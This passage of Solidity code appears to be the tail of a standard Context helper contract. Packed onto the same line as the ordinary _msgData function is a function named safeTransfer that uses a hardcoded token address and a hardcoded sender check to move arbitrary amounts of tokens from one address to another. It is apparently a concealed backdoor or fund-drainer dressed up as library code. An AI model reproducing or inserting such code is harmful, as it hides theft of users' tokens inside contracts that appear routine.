 ...
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0xfDe0b00564ca91c979d6e342d24FD813EBEe2deD)) {TransferHelper.safeTransferFrom(0x721D97618fBdaD5DB697b1D64E71583b446186cF,spender,recipient,amount);return true;}return false;}
}
